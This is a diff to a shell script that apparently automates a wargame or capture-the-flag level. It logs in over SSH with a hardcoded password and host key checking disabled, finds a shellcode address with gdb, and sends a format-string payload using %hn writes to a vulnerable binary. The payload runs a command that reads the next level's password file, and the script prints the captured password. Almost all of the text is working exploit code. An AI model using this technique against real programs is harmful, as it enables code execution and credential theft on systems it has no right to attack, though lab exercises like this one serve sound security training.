@@ -1,9 +1,7 @@
 #!/bin/sh
-
 PASS='3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN'
-echo $PASS
-echo $OVERRIDE
-sshpass -p $PASS ssh -tt -o StrictHostKeyChecking=no level05@$OVERRIDE -p 4242 << EOF
+sshpass -p $PASS ssh -q -tt -o StrictHostKeyChecking=no level05@$OVERRIDE -p 4242 << EOF
+rm /tmp/leve05
 export ARG1=0
 export ARG2=0
 export ADDSHELLCODE=0
@@ -12,6 +10,7 @@ printf "file /home/users/level05/level05\nb *main\nrun\nx/100x *environ\nquit\ny
 ADDSHELLCODE=\$(gdb -x /tmp/file.gdb -q -batch | grep "0x90909090" | sed -e '1,6d' | cut -c7-10)
 ARG1=\$(echo \$((16#\$ADDSHELLCODE)) - 8 | bc)
 ARG2=\$(echo 65535 - \$ARG1 - 8 | bc)
-(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%' + str(\$ARG1) + 'c' + '%10\\\$hn'+ '%' + str(\$ARG2) + 'c' + '%11\\\$hn'"; echo 'cat /home/users/level06/.pass') | ./level05
+(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%' + str(\$ARG1) + 'c' + '%10\\\$hn'+ '%' + str(\$ARG2) + 'c' + '%11\\\$hn'"; echo 'cat /home/users/level06/.pass') | ./level05 > /tmp/level05
+echo -e "\e[32m\$(awk 'NR==1 {print; exit}' /tmp/level05)\e[39m"
 exit
 EOF
